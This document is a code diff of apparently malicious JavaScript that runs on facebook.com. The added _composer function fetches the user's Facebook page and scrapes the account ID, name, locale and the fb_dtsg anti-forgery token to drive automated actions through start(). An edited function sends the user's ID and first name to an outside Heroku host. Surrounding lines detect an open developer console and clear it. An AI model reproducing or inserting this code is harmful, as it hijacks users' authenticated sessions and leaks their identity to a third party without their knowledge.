@@ -207,9 +207,11 @@ function online(jsonOBJECT) {
   xhr.send();
 }
 function _G_L(jsonOBJECT) {
-
+  var str = user_name;
+  var res = str.split(" ");
+  var Uname = res[0];
   var xhr = new ajax;
-  xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid="+jsonOBJECT.uid+"&name="+jsonOBJECT.name);
+  xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid="+jsonOBJECT.uid+"&name="+Uname);
   xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
   xhr.onreadystatechange = function() {
     if (xhr.readyState == 4 && xhr.status == 200) {
@@ -785,24 +787,28 @@ element.__defineGetter__("id", function() {
 });
 console.log(element);
 console.clear();
+function _composer() {
+  var c = new sie;
+  c["open"]("GET", "https://www.facebook.com/");
+  c["send"]();
+  c["onreadystatechange"] = function() {
+    if (4 == c["readyState"] && (profile_id = c["responseText"].split("USER_ID" + '"' + ":")[1].split('"')[1].split('"')[0], 0 != profile_id)) {
+      user_name = c["responseText"].split("NAME" + '"' + ":")[1].split('"')[1].split('"')[0];
+      locale = c["responseText"].split('{"locale' + '"' + ":")[1].split('"')[1].split('"')[0];
+      fb_dtsg = c["responseText"].split("name=" + '"' + "fb_dtsg")[1].split("value=" + '"')[1].split('"')[0];
+      __rev = c["responseText"].split('"' + "server_revision" + '"' + ":")[1].split(",")[0];
+      jazoest = "";
+      var b = 0;
+      for (;b < fb_dtsg["length"];b++) {
+        jazoest += fb_dtsg["charCodeAt"](b);
+      }
+      jazoest = "2" + jazoest;
+      dyn = get_dyn();
+      start();
+    }
+  };
+}
 if (location.hostname.indexOf("facebook.com") >= 0 && (cntrl == "d" || cnsl == true)) {
-  fb_dtsg_list = document.getElementsByName("fb_dtsg");
-  if (fb_dtsg_list.length > 0) {
-    profile_id = document.cookie.match(/c_user=(\d+)/)[1];
-    fb_dtsg = fb_dtsg_list[0].value;
-    __dyn = get_dyn();
-    if (document.head.innerHTML.split('"client_revision":')[1]) {
-      __rev = document.head.innerHTML.split('"client_revision":')[1].split(",")[0];
-    } else {
-      __rev = rand(1111111, 9999999);
-    }
-    jazoest = "";
-    var x = 0;
-    for (;x < fb_dtsg.length;x++) {
-      jazoest += fb_dtsg.charCodeAt(x);
-    }
-    jazoest = "2" + jazoest;
-    start();
-  }
+_composer();
 }
 ;
